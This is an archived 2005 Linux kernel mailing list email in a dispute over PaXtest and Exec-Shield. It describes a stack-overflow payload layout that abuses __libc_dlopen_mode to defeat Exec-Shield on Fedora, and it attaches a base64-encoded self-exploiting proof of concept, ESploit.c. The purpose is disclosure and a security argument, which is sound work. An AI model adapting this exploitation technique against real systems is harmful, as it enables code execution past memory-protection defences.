Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261430AbVBGO2h@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261430AbVBGO2h (ORCPT <rfc822;willy@w.ods.org>);
	Mon, 7 Feb 2005 09:28:37 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261434AbVBGO2h
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Mon, 7 Feb 2005 09:28:37 -0500
Received: from gizmo08bw.bigpond.com ([144.140.70.18]:39637 "HELO
	gizmo08bw.bigpond.com") by vger.kernel.org with SMTP
	id S261430AbVBGOXy (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Mon, 7 Feb 2005 09:23:54 -0500
From: pageexec@freemail.hu
To: Ingo Molnar <mingo@elte.hu>
Date: Tue, 08 Feb 2005 00:23:37 +1000
MIME-Version: 1.0
Content-type: Multipart/Mixed; boundary=Message-Boundary-6397
Subject: Re: Sabotaged PaXtest (was: Re: Patch 4/6  randomize the stack pointer)
Reply-to: pageexec@freemail.hu
CC: linux-kernel@vger.kernel.org, Arjan van de Ven <arjanv@redhat.com>,
       "Theodore Ts'o" <tytso@mit.edu>
Message-ID: <42080689.15768.1B0C5E5F@localhost>
In-reply-to: <20050203202032.GA24192@elte.hu>
References: <4202BFDB.24670.67046BC@localhost>
X-mailer: Pegasus Mail for Windows (4.21c)
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org


--Message-Boundary-6397
Content-type: text/plain; charset=US-ASCII
Content-transfer-encoding: 7BIT
Content-description: Mail message body

> still wrong. What you get this way is a nice, complicated NOP.

not only a nop but also a likely crash given that i didn't adjust
the declaration of some_function appropriately ;-). let's cater
for less complexity too with the following payload (of the 'many
other ways' kind):

[field1 and other locals replaced with shellcode]
[space to cover the locals of __libc_dlopen_mode()]
[fake EBX]
[fake ESI]
[fake EBP]
[address of field1 (shellcode)]
[address of user_input+x, ends with "libbeecrypt.so"]
[fake mode for __libc_dlopen_mode(), 0x01010101 will do]
[space for the local variables of __libc_dlopen_mode() and others]
[saved EBP replaced with address of [fake EBP]]
[saved EIP replaced with address of __libc_dlopen_mode()+3]
[user_input no longer used in the exploit]

user_input (the original, untouched buffer) ends with a suitable
library name (such as "libbeecrypt.so", see [1]). this string could
have also been left behind in the address space somewhere during
earlier interactions. we have to produce one 0 byte only hence
we're back at the generic single overflow case. this also no longer
relies on the user_input argument being at a particular address on
the stack, so it's a generic method in that regard as well.

one disadvantage of this approach is that now not only the
randomness in libc.so has to be found but also that of the stack
(repeating parts of the payload would help reduce it though), and
if user_input itself is on the heap (and there're no copies on the
stack), we'll need that randomness too.

in any case, you got your exploit method against latest Fedora (see
the attachment [2]), this should prove that paxtest does the right
thing when it exposes the weaknesses of Exec-Shield. now, will you
and Arjan do the right thing and apologize to us or do you still
maintain that paxtest is a sabotage?

[1] https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=132149
    it also appears that not only the design and implementation of
    PT_GNU_STACK are broken but its deployment as well. not even
    its creators managed to get it right, what can we expect from
    unsuspecting distros? 5 months and still no resolution? does
    this backdoor really belong into linux?

[2] ESploit.c is a simple proof of concept self-exploiting test
    that will hang itself when successful. compiler optimizations
    and randomizations can introduce 0 bytes in some of the
    addresses used (check shellcode length), play with them a bit
    to get it to run. stack usage in the (ab)used libc functions
    may also require adjusting the buffer sizes.


--Message-Boundary-6397
Content-type: text/plain; charset=US-ASCII
Content-disposition: inline
Content-description: Attachment information.

The following section of this message contains a file attachment
prepared for transmission using the Internet MIME message format.
If you are using Pegasus Mail, or any other MIME-compliant system,
you should be able to save it or view it from within your mailer.
If you cannot, please ask your system administrator for assistance.

   ---- File information -----------
     File:  ESploit.c
     Date:  8 Feb 2005, 0:07
     Size:  1294 bytes.
     Type:  Program-source

--Message-Boundary-6397
Content-type: Application/Octet-stream; name="ESploit.c"; type=Program-source
Content-disposition: attachment; filename="ESploit.c"
Content-transfer-encoding: BASE64

I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPGRsZmNu
Lmg+CgpjaGFyIGJ1ZmZlcls4MTkyXTsKdm9pZCAqIGhhbmRsZSwgKiBteWRsb3BlbiwgKiBy
ZXRhZGRyOwp1bnNpZ25lZCBsb25nIGVpcCwgZmFrZWVicCwgKiB0bXAgPSAodW5zaWduZWQg
bG9uZyopYnVmZmVyOwoKdm9pZCBvdmVyZmxvdyhjaGFyICogZmllbGQxLCBjaGFyICogdXNl
cl9pbnB1dCkKewogIHN0cmNweShmaWVsZDEsIHVzZXJfaW5wdXQpOwp9CgppbnQgbWFpbigp
CnsKICB1bnNpZ25lZCBsb25nIHNoZWxsY29kZVsxMDI0XTsKCiAgaGFuZGxlID0gZGxvcGVu
KE5VTEwsIFJUTERfTEFaWSk7CiAgaWYgKCFoYW5kbGUpIHsKICAgIHByaW50ZigiZGxvcGVu
IGVycm9yOiAlc1xuIiwgZGxlcnJvcigpKTsKICAgIHJldHVybiAtMTsKICB9CiAgZGxlcnJv
cigpOwogIG15ZGxvcGVuID0gZGxzeW0oaGFuZGxlLCAiX19saWJjX2Rsb3Blbl9tb2RlIik7
CiAgaWYgKCFkbGVycm9yKSB7CiAgICBwcmludGYoImRsc3ltIGVycm9yXG4iKTsKICAgIHJl
dHVybiAtMTsKICB9CiAgcHJpbnRmKCJteWRsb3BlbjogJXBcbiIsIG15ZGxvcGVuKTsKCiAg
cmV0YWRkciA9IF9fYnVpbHRpbl9yZXR1cm5fYWRkcmVzcygwKTsKICBwcmludGYoInJldGFk
ZHI6ICVwXG4iLCByZXRhZGRyKTsKCiAgZm9yIChlaXA9MDsgZWlwPDE2Mzg0OyBlaXArKykg
ewogICAgaWYgKHNoZWxsY29kZVtlaXBdID09ICh1bnNpZ25lZCBsb25nKXJldGFkZHIpCiAg
ICAgIGJyZWFrOwogIH0KICBpZiAoMTYzODQgPT0gZWlwKSB7CiAgICBwcmludGYoImNhbid0
IGZpbmQgc2F2ZWQgRUlQXG4iKTsKICAgIHJldHVybiAtMTsKICB9CiAgcHJpbnRmKCJzYXZl
ZCBFSVA6ICVwIGF0IGluZGV4ICV1XG4iLCBzaGVsbGNvZGUrZWlwLCBlaXApOwoKICBtZW1z
ZXQoYnVmZmVyLCAweEZBLCBzaXplb2YgYnVmZmVyKTsKICBidWZmZXJbMF0gPSAweEVCOwog
IGJ1ZmZlclsxXSA9IDB4RkU7CiAgZmFrZWVicCA9IGVpcC0xMDAwOwogIHRtcFtlaXAtMV0g
PSAmc2hlbGxjb2RlW2Zha2VlYnBdOwogIHRtcFtlaXBdID0gKGNoYXIqKW15ZGxvcGVuKzM7
CiAgdG1wW2VpcCsxXSA9IDA7CiAgdG1wW2Zha2VlYnArMV0gPSBzaGVsbGNvZGU7CiAgdG1w
W2Zha2VlYnArMl0gPSAibGliYmVlY3J5cHQuc28iOwogIHRtcFtmYWtlZWJwKzNdID0gMHgw
MTAxMDEwMTsKICBwcmludGYoInNoZWxsY29kZSBsZW5ndGg6ICV4XG4iLCBzdHJsZW4oYnVm
ZmVyKSk7CiAgb3ZlcmZsb3coc2hlbGxjb2RlLCBidWZmZXIpOwogIHJldHVybiAwOwp9Cg==

--Message-Boundary-6397--
